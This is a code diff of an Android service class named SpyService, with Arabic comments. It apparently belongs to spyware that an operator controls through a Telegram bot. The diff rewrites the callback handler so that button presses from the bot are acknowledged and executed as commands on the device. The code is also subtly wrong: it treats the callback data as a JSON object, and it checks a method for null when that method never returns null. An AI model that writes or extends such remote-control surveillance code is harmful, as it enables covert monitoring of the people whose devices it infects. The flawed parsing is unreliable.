@@ -162,11 +162,25 @@ public class SpyService extends Service {
                 if (updId <= bot.lastUpdateId) continue;
                 bot.lastUpdateId = updId + 1;
 
+                // معالجة callback_query (الضغط على الأزرار)
                 if (upd.has("callback_query")) {
                     JSONObject callback = upd.getJSONObject("callback_query");
-                    handleCallbackQuery(callback);
+                    String callbackId = callback.getString("id");
+                    JSONObject data = callback.getJSONObject("data");
+                    String command = data.getString("data"); // أو "callback_data"
+                    if (command == null) {
+                        command = data.getString("callback_data");
+                    }
+
+                    // إرسال تأكيد للمستخدم
+                    bot.answerCallbackQuery(callbackId, "⏳ جاري تنفيذ الأمر...");
+
+                    // تنفيذ الأمر
+                    handleCommand(command);
+                    continue;
                 }
 
+                // معالجة الرسائل النصية
                 if (upd.has("message")) {
                     JSONObject msg = upd.getJSONObject("message");
                     if (msg.has("text")) {
@@ -315,23 +329,6 @@ public class SpyService extends Service {
         } catch (Exception e) {
             Log.e(TAG, "sendMainMenu error", e);
         }
-    }
-
-    private void handleCallbackQuery(JSONObject callbackQuery) {
-        try {
-            String id = callbackQuery.getString("id");
-            JSONObject data = callbackQuery.getJSONObject("data");
-            String command = data.getString("command");
-
-            bot.answerCallbackQuery(id, "⏳ جاري تنفيذ الأمر...");
-            executeCommand(command);
-        } catch (Exception e) {
-            Log.e(TAG, "handleCallbackQuery error", e);
-        }
-    }
-
-    private void executeCommand(String cmd) {
-        handleCommand(cmd);
     }
 
     // ======================================================================
